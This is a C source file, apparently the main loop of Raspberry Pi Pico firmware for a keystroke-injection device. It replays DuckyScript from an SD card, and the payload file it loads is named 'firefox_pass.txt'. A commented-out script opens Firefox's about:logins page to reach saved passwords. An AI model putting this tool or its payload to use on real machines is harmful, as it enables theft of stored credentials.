#include <stdlib.h>
#include <stdio.h>

#include "pico/stdlib.h"
#include "bsp/board.h"
// #include "pico/cyw43_arch.h"
#include "pico/multicore.h"

#include "lib/hid/keyboard.h"
#include "lib/sd_memory/sd_memory.h"
#include "lib/duckyscript/handler.h"
#include "lib/webserver/webserver.h"

bool is_ducky_working = false;

void main1()
{
  kb_init();
  
  while (1)
  {
   kb_task();
  }
}


int main(void)
{
  stdio_init_all();
  // multicore_launch_core1(main1);

  ws_init();
  sdm_mount();

  uint8_t i = 0;
  ducky_line_t *dl;
  TCHAR buf[256];

  while (1)
  {
    if (board_button_read())  {
      while (board_button_read()) {};
      is_ducky_working = true;
      // sdm_mount();
      sdm_open_read("payloads/firefox_pass.txt");
      // gpio_put(BLINK_LED, !gpio_get_out_level(BLINK_LED));
    }

    if (is_ducky_working && dh_is_ready()) {

      // char buf1[][256] = { "STRING 0123456789\r\n", "STRING asASas\r\n", "STRING asASas\r\n", "DELAY 500\r\n", "STRING end\r\n" };
      
      if(sdm_gets(buf)) {
        dl = dp_parse_line(buf);
        dh_handle_dline(dl);
      }
      else {
        is_ducky_working = false;
        sdm_close_file();
        i = 0;
      }
    }

    
    
    // led_blinking_task();
  }
}

    // char buf[][128]= { "GUI r\r\n", "DELAY 500\r\n", "STRING firefox\r\n", "ENTER\r\n", "DELAY 500\r\n", "STRING about:logins", "ENTER\r\n", "DELAY 500\r\n", "TAB", "REPEAT 9"};
    // char buf[][128] = {"DELAY 500\r\n", "STRING 3\r\n", "REPEAT 5\r\n" , "TAB\r\n", "REPEAT 4\r\n" };
    // char buf[][256] = {"STRING 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[\\]^_`{|}~\r\n"};
    // if (is_ducky_working && kb_status() == KB_STATUS_READY) {

    //   // if(f_gets(buf, sizeof(buf), &temp_fil)) {
    //   if(buf[i]) {
    //     char *r = strstr(buf[i], "\r");
    //     if (r) *r = '\0';

    //     handle_ducky(buf[i], 0);
    //     i++;
    //   }
    //   else {
    //     is_ducky_working = false;
    //     i = 0;
    //     sdm_close_file();
    //     sdm_unmount();
    //     gpio_put(15, 0);
    //   }
    // }


    
